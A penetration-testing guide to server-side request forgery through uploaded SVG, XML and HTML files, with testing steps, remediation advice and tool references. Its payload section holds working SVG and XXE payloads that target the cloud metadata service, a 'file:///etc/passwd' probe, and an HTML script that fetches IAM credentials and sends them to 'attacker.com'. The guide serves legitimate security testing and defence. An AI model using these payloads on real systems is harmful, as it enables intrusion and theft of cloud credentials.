# SSRF via File Content

## Overview
Certain file processing features — particularly those that process URLs embedded within file content — can be leveraged for Server-Side Request Forgery (SSRF). When a server parses an uploaded file and follows URLs found within it (e.g., fetching remote stylesheets in SVG, resolving DTD references in XML, loading linked resources in HTML/PDF), an attacker can craft the file to make the server issue requests to internal endpoints.

## How It Works
- SVG files can reference external resources via `<image href="http://...">` or CSS `url()`.
- XML/DTD processing follows external entity URLs (XXE-SSRF).
- PDF generators (wkhtmltopdf, headless Chrome) process HTML/CSS in the uploaded content and follow external URLs.
- Spreadsheet imports may fetch external data sources.
- The server fetches the attacker-supplied URL from its internal network, potentially accessing metadata endpoints, admin interfaces, or internal services.

## Impact
- Access to cloud metadata service (`http://169.254.169.254/`) revealing IAM credentials.
- Port scanning / service discovery on the internal network.
- Access to internal APIs or admin panels not exposed externally.
- Reading internal files via `file://` in some parsers.

## Where to Look
- PDF generation from HTML/user content.
- SVG file processing that follows embedded URLs.
- XML import features (especially with DTD support).
- Image upload with server-side dimension verification (some libraries fetch remote URLs for this).
- OpenDocument (ODT/ODS) or DOCX import features.
- HTML import / "save webpage" features.

## Testing Steps
1. Identify file upload features that involve server-side processing (not just storage).
2. Craft an SVG with an external URL reference pointing to Burp Collaborator.
3. Upload the SVG and monitor Collaborator for an incoming HTTP request.
4. If a request arrives, the server fetches URLs from file content.
5. Escalate: change the URL to `http://169.254.169.254/latest/meta-data/`.
6. Test `http://localhost/admin`, `http://10.0.0.1/`, `http://169.254.169.254/`.
7. Try `file:///etc/passwd` in file parsers that allow file scheme.

## Payloads / Techniques
```xml
<!-- SVG SSRF via image reference -->
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://BURP_COLLABORATOR.burpcollaborator.net/ssrf_test"/>
</svg>
```

```xml
<!-- SVG SSRF via style sheet -->
<svg xmlns="http://www.w3.org/2000/svg">
  <style>@import url(http://169.254.169.254/latest/meta-data/);</style>
</svg>
```

```xml
<!-- XXE-SSRF via XML DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>
```

```html
<!-- HTML for PDF generator SSRF -->
<html>
<body>
<img src="http://169.254.169.254/latest/meta-data/" onerror="document.write(this)">
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2role')
  .then(r=>r.text()).then(d=>fetch('http://attacker.com/?data='+btoa(d)));
</script>
</body>
</html>
```

## Burp Suite Tips
- Use **Burp Collaborator** to detect blind SSRF from file processing.
- Upload files referencing the Collaborator URL and poll for interactions.
- In **Repeater**, test different file types (SVG, XML, HTML) with the same SSRF payload.

## Tools
- Burp Suite Collaborator
- SSRFmap — https://github.com/swisskyrepo/SSRFmap
- Interactsh — https://github.com/projectdiscovery/interactsh (OOB testing)

## Remediation
- Parse uploaded files with external resource fetching disabled.
- For SVG: sanitize with DOMPurify or strip external references.
- For XML: disable external entity processing.
- For PDF generators: use a whitelist of allowed URL origins or disable JS execution.
- Implement an egress firewall blocking the web server from accessing internal network ranges.
- Run file processing in an isolated, network-restricted sandbox.

## References
https://portswigger.net/web-security/ssrf
https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
